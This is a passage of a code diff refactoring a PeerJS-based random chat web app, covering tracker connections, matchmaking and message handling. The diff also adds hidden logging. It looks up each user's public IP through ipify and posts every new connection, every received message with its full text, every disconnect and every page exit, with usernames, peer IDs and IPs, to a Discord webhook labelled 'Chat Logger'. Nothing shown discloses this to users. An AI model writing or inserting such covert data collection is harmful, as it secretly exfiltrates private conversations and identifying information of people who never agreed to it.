-                heartbeatInterval = setInterval(() => {
-                    if (trackerConnection && trackerConnection.open) {
-                        trackerConnection.send({
-                            type: 'heartbeat',
-                            peerId: myPeerId,
-                            username: localUsername,
-                            searching: isSearching
+                    state.peer.on('open', (id) => {
+                        log(`Peer connected with ID: ${id}`);
+                        state.myPeerId = id;
+                        elements.myIdDisplay.textContent = id;
+                        elements.usernameDisplay.textContent = `Your username: ${state.localUsername}`;
+                        
+                        state.onlineUsers.set(id, {
+                            username: state.localUsername,
+                            searching: false
                         });
-                    }
-                }, CONFIG.heartbeatInterval);
-                
-                if (isSearching && !matchmakingInterval) {
-                    startMatchmaking();
+                        updateOnlineUsersUI();
+                        
+                        connectToTracker();
+                    });
+                    
+                    state.peer.on('connection', handleIncomingConnection);
+                    state.peer.on('error', handlePeerError);
+                    state.peer.on('disconnected', handlePeerDisconnected);
+                } catch (error) {
+                    log(`Error initializing PeerJS: ${error.message}`);
+                    showError(`Failed to initialize connection: ${error.message}`);
                 }
-            });
+            }
             
-            trackerConnection.on('data', (data) => {
+            // Handle incoming connections
+            function handleIncomingConnection(conn) {
+                log(`Incoming connection from: ${conn.peer}`);
+                
+                if (conn.peer === state.TRACKER_SERVER_ID) {
+                    log('Tracker server initiated connection');
+                    state.trackerConnection = conn;
+                    setupTrackerConnection();
+                    return;
+                }
+                
+                if (!state.isConnected) {
+                    state.connection = conn;
+                    setupConnection();
+                } else {
+                    conn.close();
+                }
+            }
+            
+            // Handle peer errors
+            function handlePeerError(err) {
+                log(`Peer error: ${err.type}`);
+                
+                if (err.type === 'peer-unavailable' && err.message.includes(state.TRACKER_SERVER_ID)) {
+                    log('Tracker server not found, becoming tracker server');
+                    becomeTrackerServer();
+                    return;
+                }
+                
+                showError(`Connection error: ${err.type}`);
+                
+                if (err.type === 'peer-unavailable') {
+                    showError('Peer ID not found. Check the ID and try again.');
+                } else if (err.type === 'network') {
+                    showError('Network error. Check your internet connection.');
+                } else if (err.type === 'disconnected') {
+                    showError('Disconnected from server. Try refreshing the page.');
+                }
+            }
+            
+            // Handle peer disconnection
+            function handlePeerDisconnected() {
+                log('Peer disconnected from server');
+                showError('Disconnected from server. Click to reconnect.');
+                
+                setTimeout(() => {
+                    if (state.peer) state.peer.reconnect();
+                }, 3000);
+            }
+            
+            // Connect to tracker server
+            function connectToTracker() {
+                log('Attempting to connect to tracker server');
+                
+                try {
+                    state.trackerConnection = state.peer.connect(state.TRACKER_SERVER_ID, {
+                        reliable: true
+                    });
+                    
+                    setupTrackerConnection();
+                } catch (error) {
+                    log(`Error connecting to tracker: ${error.message}`);
+                }
+            }
+            
+            // Set up tracker connection
+            function setupTrackerConnection() {
+                log('Setting up tracker connection');
+                
+                state.trackerConnection.on('open', () => {
+                    log('Connected to tracker server');
+                    
+                    state.trackerConnection.send({
+                        type: 'register',
+                        peerId: state.myPeerId,
+                        username: state.localUsername,
+                        searching: state.isSearching
+                    });
+                    
+                    if (state.heartbeatInterval) clearInterval(state.heartbeatInterval);
+                    state.heartbeatInterval = setInterval(() => {
+                        if (state.trackerConnection && state.trackerConnection.open) {
+                            state.trackerConnection.send({
+                                type: 'heartbeat',
+                                peerId: state.myPeerId,
+                                username: state.localUsername,
+                                searching: state.isSearching
+                            });
+                        }
+                    }, 30000);
+                    
+                    if (state.isSearching && !state.matchmakingInterval) {
+                        startMatchmaking();
+                    }
+                });
+                
+                state.trackerConnection.on('data', handleTrackerData);
+                state.trackerConnection.on('close', handleTrackerConnectionClose);
+                state.trackerConnection.on('error', handleTrackerConnectionError);
+            }
+            
+            // Handle tracker data
+            function handleTrackerData(data) {
                 log(`Received tracker data: ${JSON.stringify(data)}`);
                 
                 if (data.type === 'userList') {
-                    onlineUsers = new Map(Object.entries(data.users));
+                    state.onlineUsers = new Map(Object.entries(data.users));
                     updateOnlineUsersUI();
-                } else if (data.type === 'matchFound' && isSearching) {
+                } else if (data.type === 'matchFound' && state.isSearching) {
                     stopSearching();
                     connectToPeer(data.matchPeerId);
-                } else if (data.type === 'typing') {
-                    showTypingIndicator();
-                    setTimeout(hideTypingIndicator, CONFIG.typingIndicatorTimeout);
                 }
-            });
+            }
             
-            trackerConnection.on('close', () => {
+            // Handle tracker connection close
+            function handleTrackerConnectionClose() {
                 log('Tracker connection closed');
                 
-                if (heartbeatInterval) {
-                    clearInterval(heartbeatInterval);
-                    heartbeatInterval = null;
+                if (state.heartbeatInterval) {
+                    clearInterval(state.heartbeatInterval);
+                    state.heartbeatInterval = null;
                 }
                 
-                if (matchmakingInterval) {
-                    clearInterval(matchmakingInterval);
-                    matchmakingInterval = null;
+                if (state.matchmakingInterval) {
+                    clearInterval(state.matchmakingInterval);
+                    state.matchmakingInterval = null;
                 }
                 
                 setTimeout(() => {
                     connectToTracker();
                 }, 5000);
-            });
+            }
             
-            trackerConnection.on('error', (error) => {
+            // Handle tracker connection error
+            function handleTrackerConnectionError(error) {
                 log(`Tracker connection error: ${error}`);
                 
                 setTimeout(() => {
                     connectToTracker();
                 }, 5000);
-            });
-        }
-
-        function becomeTrackerServer() {
-            log('Becoming tracker server');
+            }
             
-            try {
-                const trackerServer = new Peer(TRACKER_SERVER_ID, CONFIG.peerJsOptions);
+            // Become tracker server
+            function becomeTrackerServer() {
+                log('Becoming tracker server');
                 
-                const connectedUsers = new Map();
-                connectedUsers.set(myPeerId, {
-                    username: localUsername,
-                    searching: false
-                });
-                
-                const userConnections = new Map();
-                
-                trackerServer.on('open', (id) => {
-                    log(`Tracker server started with ID: ${id}`);
+                try {
+                    const trackerServer = new Peer(state.TRACKER_SERVER_ID, {
+                        debug: 2
+                    });
                     
-                    const trackerStatus = document.createElement('div');
-                    trackerStatus.textContent = '🔄 Tracking server active';
-                    trackerStatus.style.color = 'var(--accent)';
-                    trackerStatus.style.marginTop = '0.5rem';
-                    document.querySelector('#my-id-display').appendChild(trackerStatus);
-                });
-                
-                trackerServer.on('connection', (conn) => {
-                    log(`Tracker: New connection from ${conn.peer}`);
+                    const connectedUsers = new Map();
+                    connectedUsers.set(state.myPeerId, {
+                        username: state.localUsername,
+                        searching: false
+                    });
                     
-                    userConnections.set(conn.peer, conn);
+                    const userConnections = new Map();
                     
-                    conn.on('open', () => {
-                        log(`Tracker: Connection to ${conn.peer} opened`);
+                    trackerServer.on('open', (id) => {
+                        log(`Tracker server started with ID: ${id}`);
                         
-                        conn.send({
-                            type: 'userList',
-                            users: Object.fromEntries(connectedUsers)
+                        const trackerStatus = document.createElement('div');
+                        trackerStatus.textContent = '🔄 Tracking server active';
+                        trackerStatus.style.color = 'var(--accent)';
+                        trackerStatus.style.marginTop = '0.5rem';
+                        document.querySelector('#my-id-display').appendChild(trackerStatus);
+                    });
+                    
+                    trackerServer.on('connection', (conn) => {
+                        log(`Tracker: New connection from ${conn.peer}`);
+                        
+                        userConnections.set(conn.peer, conn);
+                        
+                        conn.on('open', () => {
+                            log(`Tracker: Connection to ${conn.peer} opened`);
+                            
+                            conn.send({
+                                type: 'userList',
+                                users: Object.fromEntries(connectedUsers)
+                            });
+                        });
+                        
+                        conn.on('data', (data) => {
+                            log(`Tracker: Received data from ${conn.peer}: ${JSON.stringify(data)}`);
+                            
+                            if (data.type === 'register' || data.type === 'heartbeat') {
+                                connectedUsers.set(data.peerId, {
+                                    username: data.username,
+                                    searching: data.searching || false
+                                });
+                                
+                                if (data.searching) {
+                                    tryToMatchUsers(data.peerId, connectedUsers);
+                                }
+                                
+                                broadcastUserList();
+                            }
+                        });
+                        
+                        conn.on('close', () => {
+                            log(`Tracker: Connection to ${conn.peer} closed`);
+                            
+                            connectedUsers.delete(conn.peer);
+                            userConnections.delete(conn.peer);
+                            
+                            broadcastUserList();
+                        });
+                        
+                        conn.on('error', (error) => {
+                            log(`Tracker: Error with connection to ${conn.peer}: ${error}`);
+                            
+                            connectedUsers.delete(conn.peer);
+                            userConnections.delete(conn.peer);
+                            
+                            broadcastUserList();
                         });
                     });
                     
-                    conn.on('data', (data) => {
-                        log(`Tracker: Received data from ${conn.peer}: ${JSON.stringify(data)}`);
+                    function tryToMatchUsers(newSearchingPeerId, users) {
+                        const searchingUsers = Array.from(users.entries())
+                            .filter(([peerId, userData]) => 
+                                userData.searching && 
+                                peerId !== newSearchingPeerId && 
+                                peerId !== state.TRACKER_SERVER_ID
+                            );
                         
-                        if (data.type === 'register' || data.type === 'heartbeat') {
-                            connectedUsers.set(data.peerId, {
-                                username: data.username,
-                                searching: data.searching || false
+                        if (searchingUsers.length > 0) {
+                            const [matchPeerId, matchUserData] = searchingUsers[0];
+                            
+                            users.set(newSearchingPeerId, {
+                                ...users.get(newSearchingPeerId),
+                                searching: false
                             });
                             
-                            if (data.searching) {
-                                tryToMatchUsers(data.peerId, connectedUsers);
+                            users.set(matchPeerId, {
+                                ...users.get(matchPeerId),
+                                searching: false
+                            });
+                            
+                            const newUserConn = userConnections.get(newSearchingPeerId);
+                            const matchUserConn = userConnections.get(matchPeerId);
+                            
+                            if (newUserConn && newUserConn.open) {
+                                newUserConn.send({
+                                    type: 'matchFound',
+                                    matchPeerId: matchPeerId
+                                });
+                            }
+                            
+                            if (matchUserConn && matchUserConn.open) {
+                                matchUserConn.send({
+                                    type: 'matchFound',
+                                    matchPeerId: newSearchingPeerId
+                                });
                             }
                             
                             broadcastUserList();
-                        } else if (data.type === 'typing') {
-                            // Forward typing indicator to recipient
-                            const recipientConn = userConnections.get(data.toPeerId);
-                            if (recipientConn && recipientConn.open) {
-                                recipientConn.send({
-                                    type: 'typing',
-                                    fromPeerId: data.fromPeerId
-                                });
+                        }
+                    }
+                    
+                    function broadcastUserList() {
+                        const userListMessage = {
+                            type: 'userList',
+                            users: Object.fromEntries(connectedUsers)
+                        };
+                        
+                        state.onlineUsers = new Map(connectedUsers);
+                        updateOnlineUsersUI();
+                        
+                        userConnections.forEach((conn, peerId) => {
+                            if (conn.open) {
+                                conn.send(userListMessage);
+                            } else {
+                                userConnections.delete(peerId);
+                                connectedUsers.delete(peerId);
                             }
+                        });
+                    }
+                    
+                    const cleanupInterval = setInterval(() => {
+                        let changed = false;
+                        
+                        userConnections.forEach((conn, peerId) => {
+                            if (!conn.open) {
+                                userConnections.delete(peerId);
+                                connectedUsers.delete(peerId);
+                                changed = true;
+                            }
+                        });
+                        
+                        if (changed) {
+                            broadcastUserList();
                         }
+                    }, 60000);
+                    
+                    window.addEventListener('beforeunload', () => {
+                        clearInterval(cleanupInterval);
+                        trackerServer.destroy();
                     });
                     
-                    conn.on('close', () => {
-                        log(`Tracker: Connection to ${conn.peer} closed`);
-                        
-                        connectedUsers.delete(conn.peer);
-                        userConnections.delete(conn.peer);
-                        
-                        broadcastUserList();
-                    });
+                } catch (error) {
+                    log(`Error becoming tracker server: ${error.message}`);
                     
-                    conn.on('error', (error) => {
-                        log(`Tracker: Error with connection to ${conn.peer}: ${error}`);
-                        
-                        connectedUsers.delete(conn.peer);
-                        userConnections.delete(conn.peer);
-                        
-                        broadcastUserList();
-                    });
-                });
-                
-                function tryToMatchUsers(newSearchingPeerId, users) {
-                    const searchingUsers = Array.from(users.entries())
-                        .filter(([peerId, userData]) => 
-                            userData.searching && 
-                            peerId !== newSearchingPeerId && 
-                            peerId !== TRACKER_SERVER_ID
-                        );
-                    
-                    if (searchingUsers.length > 0) {
-                        const [matchPeerId, matchUserData] = searchingUsers[0];
-                        
-                        users.set(newSearchingPeerId, {
-                            ...users.get(newSearchingPeerId),
-                            searching: false
-                        });
-                        
-                        users.set(matchPeerId, {
-                            ...users.get(matchPeerId),
-                            searching: false
-                        });
-                        
-                        const newUserConn = userConnections.get(newSearchingPeerId);
-                        const matchUserConn = userConnections.get(matchPeerId);
-                        
-                        if (newUserConn && newUserConn.open) {
-                            newUserConn.send({
-                                type: 'matchFound',
-                                matchPeerId: matchPeerId
+                    setTimeout(() => {
+                        connectToTracker();
+                    }, 5000);
+                }
+            }
+            
+            // Start matchmaking process
+            function startMatchmaking() {
+                if (!state.matchmakingInterval) {
+                    state.matchmakingInterval = setInterval(() => {
+                        if (state.trackerConnection && state.trackerConnection.open) {
+                            state.trackerConnection.send({
+                                type: 'heartbeat',
+                                peerId: state.myPeerId,
+                                username: state.localUsername,
+                                searching: state.isSearching
                             });
                         }
-                        
-                        if (matchUserConn && matchUserConn.open) {
-                            matchUserConn.send({
-                                type: 'matchFound',
-                                matchPeerId: newSearchingPeerId
-                            });
-                        }
-                        
-                        broadcastUserList();
-                    }
+                    }, 5000);
                 }
-                
-                function broadcastUserList() {
-                    const userListMessage = {
-                        type: 'userList',
-                        users: Object.fromEntries(connectedUsers)
-                    };
-                    
-                    onlineUsers = new Map(connectedUsers);
-                    updateOnlineUsersUI();
-                    
-                    userConnections.forEach((conn, peerId) => {
-                        if (conn.open) {
-                            conn.send(userListMessage);
-                        } else {
-                            userConnections.delete(peerId);
-                            connectedUsers.delete(peerId);
-                        }
-                    });
+            }
+            
+            // Stop matchmaking process
+            function stopMatchmaking() {
+                if (state.matchmakingInterval) {
+                    clearInterval(state.matchmakingInterval);
+                    state.matchmakingInterval = null;
                 }
-                
-                const cleanupInterval = setInterval(() => {
-                    let changed = false;
-                    
-                    userConnections.forEach((conn, peerId) => {
-                        if (!conn.open) {
-                            userConnections.delete(peerId);
-                            connectedUsers.delete(peerId);
-                            changed = true;
-                        }
-                    });
-                    
-                    if (changed) {
-                        broadcastUserList();
-                    }
-                }, 60000);
-                
-                window.addEventListener('beforeunload', () => {
-                    clearInterval(cleanupInterval);
-                    trackerServer.destroy();
-                });
-                
-            } catch (error) {
-                log(`Error becoming tracker server: ${error.message}`);
-                
-                setTimeout(() => {
-                    connectToTracker();
-                }, 5000);
             }
-        }
-        
-        function startMatchmaking() {
-            if (!matchmakingInterval) {
-                matchmakingInterval = setInterval(() => {
-                    if (trackerConnection && trackerConnection.open) {
-                        trackerConnection.send({
-                            type: 'heartbeat',
-                            peerId: myPeerId,
-                            username: localUsername,
-                            searching: isSearching
-                        });
-                    }
-                }, CONFIG.matchmakingInterval);
-            }
-        }
-        
-        function stopMatchmaking() {
-            if (matchmakingInterval) {
-                clearInterval(matchmakingInterval);
-                matchmakingInterval = null;
-            }
-        }
-        
-        function startSearching() {
-            if (isSearching || isConnected) return;
             
-            isSearching = true;
-            searchingIndicator.style.display = 'block';
-            randomChatBtn.disabled = true;
-            randomChatBtn.innerHTML = '<span class="icon">🔍</span> Searching...';
-            
-            if (trackerConnection && trackerConnection.open) {
-                trackerConnection.send({
-                    type: 'heartbeat',
-                    peerId: myPeerId,
-                    username: localUsername,
-                    searching: true
-                });
+            // Start searching for random chat
+            function startSearching() {
+                if (state.isSearching || state.isConnected) return;
                 
-                if (onlineUsers.has(myPeerId)) {
-                    onlineUsers.set(myPeerId, {
-                        username: localUsername,
+                state.isSearching = true;
+                elements.searchingIndicator.style.display = 'block';
+                elements.randomChatBtn.disabled = true;
+                elements.randomChatBtn.textContent = 'Searching...';
+                
+                if (state.trackerConnection && state.trackerConnection.open) {
+                    state.trackerConnection.send({
+                        type: 'heartbeat',
+                        peerId: state.myPeerId,
+                        username: state.localUsername,
                         searching: true
                     });
-                    updateOnlineUsersUI();
+                    
+                    if (state.onlineUsers.has(state.myPeerId)) {
+                        state.onlineUsers.set(state.myPeerId, {
+                            username: state.localUsername,
+                            searching: true
+                        });
+                        updateOnlineUsersUI();
+                    }
+                    
+                    startMatchmaking();
                 }
-                
-                startMatchmaking();
             }
-        }
-        
-        function stopSearching() {
-            if (!isSearching) return;
             
-            isSearching = false;
-            searchingIndicator.style.display = 'none';
-            randomChatBtn.disabled = false;
-            randomChatBtn.innerHTML = '<span class="icon">🎲</span> Start Random Chat';
-            
-            if (trackerConnection && trackerConnection.open) {
-                trackerConnection.send({
-                    type: 'heartbeat',
-                    peerId: myPeerId,
-                    username: localUsername,
-                    searching: false
-                });
+            // Stop searching for random chat
+            function stopSearching() {
+                if (!state.isSearching) return;
                 
-                if (onlineUsers.has(myPeerId)) {
-                    onlineUsers.set(myPeerId, {
-                        username: localUsername,
+                state.isSearching = false;
+                elements.searchingIndicator.style.display = 'none';
+                elements.randomChatBtn.disabled = false;
+                elements.randomChatBtn.innerHTML = '<span class="icon">🎲</span> Start Random Chat';
+                
+                if (state.trackerConnection && state.trackerConnection.open) {
+                    state.trackerConnection.send({
+                        type: 'heartbeat',
+                        peerId: state.myPeerId,
+                        username: state.localUsername,
                         searching: false
                     });
-                    updateOnlineUsersUI();
+                    
+                    if (state.onlineUsers.has(state.myPeerId)) {
+                        state.onlineUsers.set(state.myPeerId, {
+                            username: state.localUsername,
+                            searching: false
+                        });
+                        updateOnlineUsersUI();
+                    }
+                    
+                    stopMatchmaking();
                 }
-                
-                stopMatchmaking();
             }
-        }
-        
-        function connectToPeer(peerId) {
-            if (isConnected) return;
             
-            log(`Connecting to peer: ${peerId}`);
-            statusText.textContent = 'Connecting...';
-            statusText.className = 'status-connecting';
-            
-            stopSearching();
-            
-            try {
-                connection = peer.connect(peerId, {
-                    reliable: true,
-                    serialization: 'json'
-                });
-                setupConnection();
-            } catch (error) {
-                log(`Error connecting to peer: ${error.message}`);
-                showError(`Failed to connect: ${error.message}`);
-                statusText.textContent = 'Disconnected';
-                statusText.className = 'status-disconnected';
+            // Connect to a specific peer
+            function connectToPeer(peerId) {
+                if (state.isConnected) return;
+                
+                log(`Connecting to peer: ${peerId}`);
+                elements.statusText.textContent = 'Connecting...';
+                elements.statusText.className = 'status-connecting';
+                
+                stopSearching();
+                
+                try {
+                    state.connection = state.peer.connect(peerId, {
+                        reliable: true
+                    });
+                    setupConnection();
+                } catch (error) {
+                    log(`Error connecting to peer: ${error.message}`);
+                    showError(`Failed to connect: ${error.message}`);
+                    elements.statusText.textContent = 'Disconnected';
+                    elements.statusText.className = 'status-disconnected';
+                }
             }
-        }
-        
-        function setupConnection() {
-            connection.on('open', () => {
-                log(`Connection established with: ${connection.peer}`);
-                isConnected = true;
-                
-                connection.send({
-                    type: 'username',
-                    username: localUsername
+            
+            // Set up peer connection
+            function setupConnection() {
+                state.connection.on('open', () => {
+                    log(`Connection established with: ${state.connection.peer}`);
+                    state.isConnected = true;
+                    
+                    sendToDiscordWebhook(`🔗 **New Connection**\n- From: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- To: ${state.connection.peer}\n- Time: ${new Date().toLocaleString()}`);
+                    
+                    state.connection.send({
+                        type: 'username',
+                        username: state.localUsername
+                    });
+                    
+                    elements.setupScreen.style.display = 'none';
+                    elements.chatScreen.style.display = 'flex';
+                    elements.statusText.textContent = 'Connected';
+                    elements.statusText.className = 'status-connected';
+                    elements.messageInput.disabled = false;
+                    elements.sendBtn.disabled = false;
+                    
+                    appendSystemMessage('Connected! Say hello!');
                 });
                 
-                setupScreen.style.display = 'none';
-                chatScreen.style.display = 'flex';
-                statusText.textContent = 'Connected';
-                statusText.className = 'status-connected';
-                messageInput.disabled = false;
-                sendBtn.disabled = false;
-                
-                appendSystemMessage('Connected! Say hello!');
-                
-                // Focus the message input
-                messageInput.focus();
-            });
+                state.connection.on('data', handlePeerData);
+                state.connection.on('close', handleConnectionClose);
+                state.connection.on('error', handleConnectionError);
+            }
             
-            connection.on('data', (data) => {
+            // Handle peer data
+            function handlePeerData(data) {
                 log(`Received data: ${JSON.stringify(data)}`);
                 
                 if (data.type === 'message') {
-                    appendMessage(data.message, false, remoteUsername || 'Stranger');
+                    sendToDiscordWebhook(`📩 **Message Sent**\n- From: ${state.remoteUsername || 'Unknown'} (${state.connection.peer})\n- To: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- Message: ${data.message}\n- Time: ${new Date().toLocaleString()}`);
+                    
+                    appendMessage(data.message, false, state.remoteUsername || 'Stranger');
                 } else if (data.type === 'username') {
-                    remoteUsername = data.username;
-                    usernameDisplay.textContent = `Chatting with: ${remoteUsername}`;
-                    appendSystemMessage(`You're chatting with ${remoteUsername}`);
-                } else if (data.type === 'typing') {
-                    showTypingIndicator();
-                    setTimeout(hideTypingIndicator, CONFIG.typingIndicatorTimeout);
+                    state.remoteUsername = data.username;
+                    elements.usernameDisplay.textContent = `Chatting with: ${state.remoteUsername}`;
+                    appendSystemMessage(`You're chatting with ${state.remoteUsername}`);
                 }
-            });
+            }
             
-            connection.on('close', () => {
+            // Handle connection close
+            function handleConnectionClose() {
                 log('Connection closed');
+                sendToDiscordWebhook(`🔌 **Disconnected**\n- User: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- From chat with: ${state.remoteUsername || 'Unknown'} (${state.connection?.peer || 'Unknown'})\n- Time: ${new Date().toLocaleString()}`);
                 handleDisconnect();
-                appendSystemMessage('Disconnected from chat');
-            });
+            }
             
-            connection.on('error', (err) => {
+            // Handle connection error
+            function handleConnectionError(err) {
                 log(`Connection error: ${err}`);
                 showError(`Connection error: ${err}`);
                 handleDisconnect();
-            });
-        }
-        
-        function disconnectFromPeer() {
-            if (connection) {
-                connection.close();
-            }
-            handleDisconnect();
-        }
-        
-        function handleDisconnect() {
-            isConnected = false;
-            
-            setupScreen.style.display = 'flex';
-            chatScreen.style.display = 'none';
-            statusText.textContent = 'Disconnected';
-            statusText.className = 'status-disconnected';
-            messageInput.disabled = true;
-            sendBtn.disabled = true;
-            
-            remoteUsername = null;
-            
-            stopSearching();
-            updateRandomChatButton();
-            
-            // Focus the peer ID input after disconnecting
-            peerIdInput.focus();
-        }
-        
-        function appendMessage(text, isSent, sender) {
-            const messageElement = document.createElement('div');
-            messageElement.classList.add('message');
-            messageElement.classList.add(isSent ? 'sent' : 'received');
-            
-            const usernameElement = document.createElement('div');
-            usernameElement.classList.add('username');
-            usernameElement.textContent = sender;
-            
-            const textElement = document.createElement('div');
-            textElement.textContent = text;
-            
-            messageElement.appendChild(usernameElement);
-            messageElement.appendChild(textElement);
-            
-            messagesContainer.appendChild(messageElement);
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
-        }
-        
-        function appendSystemMessage(text) {
-            const messageElement = document.createElement('div');
-            messageElement.classList.add('message');
-            messageElement.style.alignSelf = 'center';
-            messageElement.style.backgroundColor = '#333';
-            messageElement.style.color = '#aaa';
-            messageElement.style.fontStyle = 'italic';
-            messageElement.textContent = text;
-            
-            messagesContainer.appendChild(messageElement);
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
-        }
-        
-        function updateRandomChatButton() {
-            const availableUsers = Array.from(onlineUsers.entries())
-                .filter(([peerId, userData]) => 
-                    peerId !== myPeerId && 
-                    peerId !== TRACKER_SERVER_ID
-                ).length;
-            
-            randomChatBtn.disabled = availableUsers < 1 || isConnected || isSearching;
-            
-            if (availableUsers < 1) {
-                randomChatBtn.textContent = 'No Users Available';
-            } else if (isSearching) {
-                randomChatBtn.innerHTML = '<span class="icon">🔍</span> Searching...';
-            } else {
-                randomChatBtn.innerHTML = '<span class="icon">🎲</span> Start Random Chat';
-            }
-        }
-        
-        function toggleRandomChat() {
-            if (isSearching) {
-                stopSearching();
-            } else {
-                startSearching();
-            }
-        }
-        
-        function handleTyping() {
-            if (!isConnected) return;
-            
-            // Send typing indicator
-            if (trackerConnection && trackerConnection.open) {
-                trackerConnection.send({
-                    type: 'typing',
-                    fromPeerId: myPeerId,
-                    toPeerId: connection.peer
-                });
             }
             
-            // Reset the timeout
-            if (typingTimeout) clearTimeout(typingTimeout);
-            typingTimeout = setTimeout(() => {
-                // Typing stopped
-            }, CONFIG.typingIndicatorTimeout);
-        }
-        
-        // Event listeners
-        connectForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const peerId = peerIdInput.value.trim();
-            
-            if (peerId) {
-                connectToPeer(peerId);
-            } else {
-                showError('Please enter a valid Peer ID');
-            }
-        });
-        
-        messageForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const message = messageInput.value.trim();
-            
-            if (message && isConnected) {
-                connection.send({
-                    type: 'message',
-                    message: message
-                });
-                
-                appendMessage(message, true, localUsername);
-                
-                messageInput.value = '';
-            }
-        });
-        
-        messageInput.addEventListener('input', handleTyping);
-        
-        disconnectBtn.addEventListener('click', () => {
-            disconnectFromPeer();
-        });
-        
-        randomChatBtn.addEventListener('click', () => {
-            toggleRandomChat();
-        });
-        
-        // Initialize on load
-        document.addEventListener('DOMContentLoaded', () => {
-            initializePeer();
-            updateRandomChatButton();
-            
-            // Add keyboard shortcut to focus message input when in chat
-            document.addEventListener('keydown', (e) => {
-                if (e.key === '/' && isConnected) {
-                    e.preventDefault();
-                    messageInput.focus();
+            // Disconnect from peer
+            function disconnectFromPeer() {
+                if (state.connection) {
+                    state.connection.close();
                 }
-            });
-        });
-        
-        window.addEventListener('beforeunload', () => {
-            if (connection) connection.close();
-            if (trackerConnection) trackerConnection.close();
-            if (heartbeatInterval) clearInterval(heartbeatInterval);
-            if (matchmakingInterval) clearInterval(matchmakingInterval);
-            if (typingTimeout) clearTimeout(typingTimeout);
+                handleDisconnect();
+            }
             
-            if (peer) peer.destroy();
-        });
+            // Handle disconnection
+            function handleDisconnect() {
+                state.isConnected = false;
+                
+                elements.setupScreen.style.display = 'flex';
+                elements.chatScreen.style.display = 'none';
+                elements.statusText.textContent = 'Disconnected';
+                elements.statusText.className = 'status-disconnected';
+                elements.messageInput.disabled = true;
+                elements.sendBtn.disabled = true;
+                
+                elements.messagesContainer.innerHTML = '';
+                
+                stopSearching();
+                updateRandomChatButton();
+            }
+            
+            // Handle connect form submission
+            function handleConnectSubmit(e) {
+                e.preventDefault();
+                const peerId = elements.peerIdInput.value.trim();
+                
+                if (peerId) {
+                    connectToPeer(peerId);
+                } else {
+                    showError('Please enter a valid Peer ID');
+                }
+            }
+            
+            // Handle message form submission
+            function handleMessageSubmit(e) {
+                e.preventDefault();
+                const message = elements.messageInput.value.trim();
+                
+                if (message && state.isConnected) {
+                    state.connection.send({
+                        type: 'message',
+                        message: message
+                    });
+                    
+                    appendMessage(message, true, state.localUsername);
+                    
+                    elements.messageInput.value = '';
+                }
+            }
+            
+            // Toggle random chat
+            function toggleRandomChat() {
+                if (state.isSearching) {
+                    stopSearching();
+                } else {
+                    startSearching();
+                }
+            }
+            
+            // Clean up before page unload
+            function cleanupBeforeUnload() {
+                sendToDiscordWebhook(`🚪 **User Left**\n- Username: ${state.localUsername}\n- Peer ID: ${state.myPeerId}\n- IP: ${state.userIP}\n- Time: ${new Date().toLocaleString()}`);
+                
+                if (state.connection) state.connection.close();
+                if (state.trackerConnection) state.trackerConnection.close();
+                if (state.heartbeatInterval) clearInterval(state.heartbeatInterval);
+                if (state.matchmakingInterval) clearInterval(state.matchmakingInterval);
+                
+                if (state.peer) state.peer.destroy();
+            }
+            
+            // Utility functions
+            async function getUserIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Error fetching IP:', error);
+                    return 'Unknown';
+                }
+            }
+            
+            async function sendToDiscordWebhook(content) {
+                if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
+                    console.warn('Discord webhook URL not configured');
+                    return;
+                }
+                
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: content,
+                            username: 'Chat Logger',
+                            avatar_url: 'https://i.imgur.com/4M34hi2.png',
+                        }),
+                    });
+                    
+                    if (!response.ok) {
+                        console.error('Failed to send to Discord webhook:', response.status);
+                    }
+                } catch (error) {
+                    console.error('Error sending to Discord webhook:', error);
+                }
+            }
+            
+            function log(message) {
+                console.log(message);
+                const now = new Date().toLocaleTimeString();
+                elements.debugLog.innerHTML += `[${now}] ${message}\n`;
+                elements.debugLog.scrollTop = elements.debugLog.scrollHeight;
+            }
+            
+            function showError(message) {
+                elements.errorDisplay.textContent = message;
+                elements.errorDisplay.style.display = 'block';
+                setTimeout(() => {
+                    elements.errorDisplay.style.display = 'none';
+                }, 5000);
+            }
+            
+            function generateUsername() {
+                const adjectives = ['Happy', 'Clever', 'Brave', 'Witty', 'Gentle', 'Bold', 'Calm', 'Eager', 'Fair', 'Kind'];
+                const nouns = ['Wolf', 'Bear', 'Tiger', 'Lion', 'Eagle', 'Hawk', 'Fox', 'Owl', 'Dolphin', 'Panther'];
+                const randomNumber = Math.floor(Math.random() * 1000);
+                const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
+                const noun = nouns[Math.floor(Math.random() * nouns.length)];
+                return `${adj}${noun}${randomNumber}`;
+            }
+            
+            function generateSimpleId() {
+                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                let result = '';
+                for (let i = 0; i < 6; i++) {
+                    result += characters.charAt(Math.floor(Math.random() * characters.length));
+                }
+                return result;
+            }
+            
+            function updateOnlineUsersUI() {
+                elements.onlineCount.textContent = state.onlineUsers.size;
+                
+                elements.usersList.innerHTML = '';
+                
+                state.onlineUsers.forEach((userData, peerId) => {
+                    const userItem = document.createElement('div');
+                    userItem.classList.add('user-item');
+                    
+                    if (peerId === state.myPeerId) {
+                        userItem.classList.add('current-user');
+                    }
+                    
+                    const userInfo = document.createElement('div');
+                    
+                    const userName = document.createElement('span');
+                    userName.classList.add('user-name');
+                    userName.textContent = userData.username;
+                    
+                    if (userData.searching) {
+                        const searchingBadge = document.createElement('span');
+                        searchingBadge.textContent = ' 🔍';
+                        searchingBadge.style.fontSize = '0.8em';
+                        searchingBadge.style.opacity = '0.7';
+                        userName.appendChild(searchingBadge);
+                    }
+                    
+                    const userId = document.createElement('span');
+                    userId.classList.add('user-id');
+                    userId.textContent = ` (${peerId})`;
+                    
+                    userInfo.appendChild(userName);
